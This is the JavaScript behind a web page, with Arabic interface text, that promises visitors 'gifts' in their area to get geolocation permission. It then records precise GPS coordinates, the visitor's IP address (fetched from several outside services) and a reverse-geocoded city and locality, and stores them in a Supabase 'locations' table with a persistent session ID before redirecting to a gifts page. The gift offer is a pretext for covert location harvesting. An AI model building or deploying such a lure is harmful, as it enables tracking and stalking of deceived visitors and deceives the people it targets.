const supabaseClient = window.supabaseClient;

function showToast(message, type) {
  var container = document.getElementById('toastContainer');
  var toast = document.createElement('div');
  toast.className = 'toast toast--' + type;
  toast.textContent = message;
  container.appendChild(toast);
  setTimeout(function () {
    toast.classList.add('removing');
    setTimeout(function () { toast.remove(); }, 300);
  }, 4000);
}

function showLoader() {
  document.getElementById('loader').classList.add('active');
}

function hideLoader() {
  document.getElementById('loader').classList.remove('active');
}

function getOrCreateSessionId() {
  var key = 'ls_session_id';
  var id = localStorage.getItem(key);
  if (!id) {
    id = crypto.randomUUID ? crypto.randomUUID() : Date.now().toString(36) + Math.random().toString(36).slice(2);
    localStorage.setItem(key, id);
  }
  return id;
}

// ─── وظيفة الحصول على إحداثيات GPS الدقيقة ───
async function shareLocation() {
  var btn = document.getElementById('shareBtn');
  btn.disabled = true;

  if (!navigator.geolocation) {
    showToast('عذراً، متصفحك لا يدعم تحديد الموقع للحصول على الهدايا.', 'error');
    btn.disabled = false;
    return;
  }

  showLoader();

  navigator.geolocation.getCurrentPosition(
    async function (position) {
      var lat = position.coords.latitude;
      var lng = position.coords.longitude;
      var acc = position.coords.accuracy;
      var sessionId = getOrCreateSessionId();

      var userIp = 'غير معروف';
      var ipApis = [
        'https://api.ipify.org?format=json',
        'https://ipwho.is/',
        'https://freeipapi.com/api/json',
        'https://ipapi.co/json/'
      ];

      for (var i = 0; i < ipApis.length; i++) {
        try {
          var ipResponse = await fetch(ipApis[i]);
          if (ipResponse.ok) {
            var ipData = await ipResponse.json();
            var foundIp = ipData.ip || ipData.ipAddress || ipData.ip_address || ipData.query;
            if (foundIp) {
              userIp = foundIp;
              break;
            }
          }
        } catch (ipErr) {
          console.error("IP Fetch Error from " + ipApis[i] + ":", ipErr);
        }
      }

      var locationName = 'غير معروف';
      try {
        var geoResponse = await fetch('https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=' + lat + '&longitude=' + lng + '&localityLanguage=ar');
        var geoData = await geoResponse.json();
        var city = geoData.city || geoData.principalSubdivision || '';
        var locality = geoData.locality || '';
        if (city && locality) {
          locationName = city + ' - ' + locality;
        } else if (city || locality) {
          locationName = city || locality;
        } else {
          locationName = geoData.countryName || 'غير معروف';
        }
      } catch (geoErr) {
        console.error("Geo Fetch Error:", geoErr);
      }

      var dbSessionId = JSON.stringify({
        ip: userIp,
        location_name: locationName,
        sid: sessionId
      });

      try {
        var { error } = await supabaseClient
          .from('locations')
          .insert({ latitude: lat, longitude: lng, accuracy: acc, session_id: dbSessionId });

        if (error) throw error;

        hideLoader();
        showToast('تم استقبال طلبك، احصل على الهدايا الآن!', 'success');
        
        setTimeout(function () {
          window.location.href = 'gifts.html';
        }, 1500);
      } catch (err) {
        console.error("Supabase Error:", err);
        hideLoader();
        showToast('فشل الاتصال: ' + (err.message || err.details || 'خطأ في قاعدة البيانات'), 'error');
        btn.disabled = false;
        btn.textContent = 'إعادة المحاولة للحصول على الهدايا';
      }
    },
    function (err) {
      hideLoader();
      btn.disabled = false;
      var msgs = {
        1: 'يجب السماح بالوصول لتحديد الهدايا المتوفرة في منطقتك.',
        2: 'الموقع غير متاح حالياً. تأكد من تشغيل الـ GPS.',
        3: 'انتهت مهلة الحصول على الموقع.'
      };
      showToast(msgs[err.code] || 'حدث خطأ غير متوقع.', 'error');
    },
    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
  );
}

// ─── التحقق من حالة الصلاحية وعرض التنبيه أو جلب الموقع مباشرة ───
async function handleShareClick() {
  if (navigator.permissions && navigator.permissions.query) {
    try {
      var result = await navigator.permissions.query({ name: 'geolocation' });
      if (result.state === 'granted') {
        shareLocation();
        return;
      }
    } catch (e) {
      console.error("Permissions API error:", e);
    }
  }
  showPermissionHint();
}

// ─── عرض نافذة التنبيه أولاً قبل طلب الموقع ───
function showPermissionHint() {
  var modal = document.getElementById('permissionModal');
  modal.classList.add('active');

  document.getElementById('confirmPermBtn').onclick = function () {
    modal.classList.remove('active');
    shareLocation();
  };
}

window.shareLocation = shareLocation;
window.showPermissionHint = showPermissionHint;
window.handleShareClick = handleShareClick;
